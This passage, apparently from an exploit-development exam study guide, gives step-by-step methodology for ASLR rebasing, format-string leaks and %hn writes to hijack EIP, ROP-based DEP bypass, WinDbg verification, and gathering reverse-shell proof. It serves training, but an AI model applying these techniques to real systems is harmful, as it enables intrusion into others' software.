  • Compute the module base: leaked_addr - (IDA_static_addr - IDA_imagebase). Confirm it is page-aligned (& 0xFFF == 0).
  • Rebase all gadget addresses: gadget_runtime = module_base + (gadget_IDA_addr - IDA_imagebase)
  • Partial overwrite option: if overflow is null-terminated before reaching 4 bytes, write 1–2 low bytes to redirect EIP within the same page as the current return address.
  • Stack ASLR: the stack base also varies. A stack address leaked via format string is needed for any stack-relative write target. Save both module and stack leaks before computing final addresses.

13.11 Format String Exploit Workflow

  • Confirm the format string injection point: send AAAA %x %x %x %x %x and look for 41414141 in the response at a predictable offset.
  • Determine the stack offset where your input appears: AAAA %1$x, AAAA %2$x, … until you see 41414141. That is your “write offset”.
  • Use %N$x at higher offsets to leak code and stack pointers for ASLR bypass.
  • Identify the write target: saved EIP in the vulnerable function’s stack frame, an SEH record, or a function pointer in a dispatch table.
  • Use %hn (two 2-byte writes) to overwrite the target with your ROP chain start address. Test with a known benign value first (0xdeadbeef) to confirm the write works before overwriting EIP.
  • After EIP redirection, the ROP chain must also handle DEP (if active). Combine leak + write + ROP chain in one script.

13.12 Reliability & Finalization

  • Test the exploit across at least 3 fresh VM reboots (ASLR changes bases; confirm your leak-and-rebase logic is correct every time).
  • If the exploit depends on timing (async recv, race condition): add a small delay or retry loop; never rely on a single-attempt “lucky shot”.
  • Increase or decrease the NOP sled if the shellcode crashes intermittently. Verify ESP points to your NOPs at the JMP ESP moment in WinDbg.
  • Final check: dump the memory region containing your shellcode from WinDbg (db esp L300); manually scan for any bad char bytes in your shellcode or ROP chain.
  • For DEP bypass: confirm the allocated RWX region is actually marked executable (!vprot <new_region> should show PAGE_EXECUTE_READWRITE).
  • For ASLR bypass: confirm the base calculation is correct: leaked_val - offset == multiple of 0x1000. If the base is mis-aligned, the offset calculation is wrong.
  • Clean up the exploit script: remove debugging prints, ensure all hardcoded offsets are labeled with comments. The script must be self-explanatory for the examiner.

13.13 Proof & Documentation

  • Run the exploit, receive the reverse shell, and run whoami, ipconfig, hostname. Screenshot all three commands in the same shell window.
  • Find and display proof.txt or the designated proof file: type C:\Users\Administrator\Desktop\proof.txt. Screenshot it alongside your IP.
  • Screenshot the full exploit script running and the shell opening. Include the WinDbg output showing the crash, your mitigation bypass, and the final RET into shellcode.
  • Document in your script comments: the vulnerability type, offset to EIP/nSEH, bad characters, return address with module name, gadget addresses with source module, and shellcode generation command.
  • Remove any test files (dropped payloads, webshells) you placed during exploitation.
